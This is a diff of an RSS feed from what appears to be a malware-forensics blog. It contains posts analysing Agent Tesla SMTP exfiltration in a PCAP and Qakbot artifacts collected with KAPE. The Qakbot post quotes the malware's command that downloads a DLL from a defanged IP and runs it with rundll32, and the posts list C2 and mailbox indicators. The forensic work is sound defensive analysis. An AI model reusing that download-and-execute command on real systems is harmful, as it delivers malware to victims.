@@ -12,13 +12,13 @@
 	<atom:link href="/blog/category/forensic-analysis/feed/" rel="self" type="application/rss+xml" />
 	<link>/blog/</link>
 	<description></description>
-	<lastBuildDate>Wed, 26 Jul 2023 15:13:03 +0000</lastBuildDate>
+	<lastBuildDate>Sat, 18 Nov 2023 13:49:00 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=6.2.2</generator>
+	<generator>https://wordpress.org/?v=6.4.1</generator>
 
 <image>
 	<url>/blog/wp-content/uploads/2023/03/cropped-android-chrome-512x512-1-32x32.png</url>
@@ -42,18 +42,19 @@
 		<category><![CDATA[forensics]]></category>
 		<category><![CDATA[malspam]]></category>
 		<category><![CDATA[malware]]></category>
+		<category><![CDATA[malwr0nwind0z]]></category>
 		<category><![CDATA[pcap]]></category>
 		<category><![CDATA[remote access trojan]]></category>
 		<category><![CDATA[SMTP]]></category>
 		<category><![CDATA[SMTP Data Exfiltration]]></category>
 		<category><![CDATA[Suricata]]></category>
 		<category><![CDATA[Wireshark]]></category>
-		<guid isPermaLink="false">/blog/?p=1165</guid>
+		<guid isPermaLink="false">https://malwr0nwind0z.com/?p=1165</guid>
 
 					<description><![CDATA[<p>Simplifying Network Forensic Analysis: Exploring Wireshark PCAP Files with Brim Wireshark is a powerful network protocol analyzer that allows network administrators and security professionals to monitor and inspect network traffic. It captures packets in real-time or reads from existing capture files, known as PCAP files, for offline analysis. However, as the complexity of network data &#8230;</p>
 <p class="read-more"> <a class="" href="/blog/post_7-25-23_network_forensics_agent_tesla/"> <span class="screen-reader-text">Network Forensics with Wireshark and Brim: Analyzing a PCAP from an Agent Tesla infection</span> Read More &#187;</a></p>
 <p>The post <a href="/blog/post_7-25-23_network_forensics_agent_tesla/">Network Forensics with Wireshark and Brim: Analyzing a PCAP from an Agent Tesla infection</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></description>
-										<content:encoded><![CDATA[<p><img decoding="async" width="623" height="155" class="wp-image-1169" src="/blog/wp-content/uploads/2023/07/a-close-up-of-a-logo-description-automatically-ge.jpeg" alt="A close up of a logo
+										<content:encoded><![CDATA[<p><img fetchpriority="high" decoding="async" width="623" height="155" class="wp-image-1169" src="/blog/wp-content/uploads/2023/07/a-close-up-of-a-logo-description-automatically-ge.jpeg" alt="A close up of a logo
 
 Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-close-up-of-a-logo-description-automatically-ge.jpeg 623w, /blog/wp-content/uploads/2023/07/a-close-up-of-a-logo-description-automatically-ge-300x75.jpeg 300w" sizes="(max-width: 623px) 100vw, 623px" /></p>
 <h4>Simplifying Network Forensic Analysis: Exploring Wireshark PCAP Files with Brim</h4>
@@ -81,16 +82,16 @@ Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-
 <p>I reviewed the post infection traffic from this malware using Wireshark and Brim. The review of the Wireshark capture reveals a DNS request for smtp.marintravellft.com. This was the start data exfiltration over SMTP.</p>
 <p><img decoding="async" width="1893" height="43" class="wp-image-1171" src="/blog/wp-content/uploads/2023/07/word-image-1165-3.png" srcset="/blog/wp-content/uploads/2023/07/word-image-1165-3.png 1893w, /blog/wp-content/uploads/2023/07/word-image-1165-3-300x7.png 300w, /blog/wp-content/uploads/2023/07/word-image-1165-3-1024x23.png 1024w, /blog/wp-content/uploads/2023/07/word-image-1165-3-768x17.png 768w, /blog/wp-content/uploads/2023/07/word-image-1165-3-1536x35.png 1536w" sizes="(max-width: 1893px) 100vw, 1893px" /><strong>Figure 2: Wireshark capture of C2 traffic show a DNS request to smtp.marintravellft.com.</strong></p>
 <p>Next, I seen successful authentication to a compromised email address (schayer@marintravellft.com). The body of the email shows that customer data is being exfiltrated, which includes the hostname, ip address, and username of the infected host machine.</p>
-<p><img decoding="async" width="1920" height="652" class="wp-image-1172" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica.png" alt="A screenshot of a computer
+<p><img loading="lazy" decoding="async" width="1920" height="652" class="wp-image-1172" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica.png" alt="A screenshot of a computer
 
 Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica.png 1920w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-300x102.png 300w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1024x348.png 1024w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-768x261.png 768w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1536x522.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /><strong>Figure 3: Wireshark capture of C2 Traffic showing a successful connection over SMTP.</strong></p>
 <p>.</p>
-<p><img decoding="async" width="1280" height="909" class="wp-image-1173" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1.png" alt="A screenshot of a computer
+<p><img loading="lazy" decoding="async" width="1280" height="909" class="wp-image-1173" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1.png" alt="A screenshot of a computer
 
 Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1.png 1280w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1-300x213.png 300w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1-1024x727.png 1024w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1-768x545.png 768w" sizes="(max-width: 1280px) 100vw, 1280px" /><strong>Figure 4: Wireshark capture of C2 traffic showing customer data being sent to a compromised email address (schayer@marintravellft.com).</strong></p>
 <p><strong>Agent Tesla – Exfiltration detected by Brim’s Suricata</strong></p>
 <p>Lastly, I loaded the Wireshark PCAP file into Brim. Brim’s Suricata signatures were able to detect and alert on the C2 connection to IP 208.91.199.224:58, which is the data exfiltration over SMTP.</p>
-<p><img decoding="async" width="1918" height="1031" class="wp-image-1174" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2.png" alt="A screenshot of a computer
+<p><img loading="lazy" decoding="async" width="1918" height="1031" class="wp-image-1174" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2.png" alt="A screenshot of a computer
 
 Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2.png 1918w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2-300x161.png 300w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2-1024x550.png 1024w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2-768x413.png 768w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2-1536x826.png 1536w" sizes="(max-width: 1918px) 100vw, 1918px" /><strong>Figure 5: Brim’s Suricata engine detects the data exfiltration over SMTP.</strong></p>
 <p>That ends this blog, where we used Wireshark and Brim to collect and analyze network traffic from stage 1 of this Agent Tesla infection.</p>
@@ -119,11 +120,13 @@ Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-
 		<category><![CDATA[dead-box forensics]]></category>
 		<category><![CDATA[forensics]]></category>
 		<category><![CDATA[KAPE]]></category>
+		<category><![CDATA[Kroll Artifact Parser And Extractor]]></category>
 		<category><![CDATA[malware]]></category>
+		<category><![CDATA[malwr0nwind0z]]></category>
 		<category><![CDATA[onenote]]></category>
 		<category><![CDATA[Qakbot]]></category>
 		<category><![CDATA[Qaknote]]></category>
-		<guid isPermaLink="false">/blog/?p=1097</guid>
+		<guid isPermaLink="false">https://malwr0nwind0z.com/?p=1097</guid>
 
 					<description><![CDATA[<p>KAPE: Kroll Artifact Parser and Extractor KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and &#8230;</p>
 <p class="read-more"> <a class="" href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/"> <span class="screen-reader-text">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</span> Read More &#187;</a></p>
@@ -155,7 +158,7 @@ Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-
 <p><strong>Qakbot &#8211; Forensic Artifacts</strong></p>
 <p>The review of the user’s Recent folder shows a lnk file for O P E N .wsf, indicating that it was double clicked and executed. Microsoft Protection (MPLog) was able to log the execution of this WScript file (O P E N .wsf) as having PID:7636 and the process start time: 133225496244686642 (LDAP/FILETIME) which converts to Sunday, March 5, 2023 11:13:44 PM GMT-05:00.</p>
 <p><img decoding="async" src="/blog/wp-content/uploads/2023/03/word-image-1097-8.jpeg" /><strong>Figure 7: Lnk file (located in Recent folder) pointing to the WScript file (O P E N .wsf) that the user executed.</strong></p>
-<p><strong><img decoding="async" src="/blog/wp-content/uploads/2023/03/Windows_Defender_log_pid_start_wsf.jpg" alt="" width="440" height="18" /> </strong></p>
+<p><strong><img loading="lazy" decoding="async" src="/blog/wp-content/uploads/2023/03/Windows_Defender_log_pid_start_wsf.jpg" alt="" width="440" height="18" /> </strong></p>
 <p><strong>Figure 8: Microsoft Protection logging the PID and execution time of the WScript file (O P E N .wsf).</strong></p>
 <p>The WScript file invokes PowerShell to download a malicious Qakbot .dll from the following URL:</p>
 <p>Download URL: http://143.198.63[.]241/MCv/020 -O $env:TEMP; rundll32 $env:TEMP\dysphemistic.dll,RS32;</p>
